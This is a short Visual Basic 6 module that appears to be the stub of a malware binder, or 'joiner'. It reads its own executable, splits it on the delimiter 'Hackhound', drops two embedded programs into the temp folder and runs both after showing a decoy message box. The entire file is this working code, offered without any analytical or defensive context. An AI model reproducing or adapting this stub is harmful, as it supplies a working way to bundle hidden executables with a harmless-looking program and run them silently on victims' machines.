Attribute VB_Name = "ModMain"
Sub Main()

Dim buffer1 As String
Dim cutfiles() As String
Dim splittkey As String
splittkey = "Hackhound"

Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
buffer1 = Space(LOF(1))
Get #1, , buffer1
Close #1

cutfiles = Split(buffer1, splittkey)

Open Environ$("tmp") & "\Joinedout.exe" For Binary As #1
Put #1, , cutfiles(1)
Close #1

MsgBox cutfiles(2), vbInformation, "Joiner"

Open Environ$("tmp") & "\Joinedout2.exe" For Binary As #1
Put #1, , cutfiles(3)
Close #1

Shell Environ$("tmp") & "\Joinedout.exe", vbNormalFocus
Shell Environ$("tmp") & "\Joinedout2.exe", vbNormalFocus


End Sub
